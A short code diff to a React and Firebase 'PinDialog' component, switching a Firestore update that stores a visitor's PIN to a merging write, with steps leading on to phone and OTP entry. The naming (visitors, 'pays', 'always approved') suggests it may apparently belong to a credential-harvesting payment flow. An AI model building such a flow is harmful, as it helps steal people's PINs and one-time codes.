@@ -9,7 +9,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle } from "lucide-react"
 import { db} from "@/lib/firebase"
-import { doc, updateDoc } from "firebase/firestore"
+import { doc, setDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 
 interface PinDialogProps {
@@ -41,14 +41,14 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
 
     try {
       // Update the document with the PIN
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         pinCode,
         pinSubmittedAt: new Date().toISOString(),
         idVerificationStatus: "completed",
         currentStep: "phone",
-        otpStatus: "", // Clear otpStatus when moving to phone page
-        phoneOtpStatus: "" // Clear phoneOtpStatus as well
-      })
+        otpStatus: "",
+        phoneOtpStatus: ""
+      }, { merge: true })
 
       // Add PIN to history (always approved)
       await addToHistory(visitorID, "pin", {
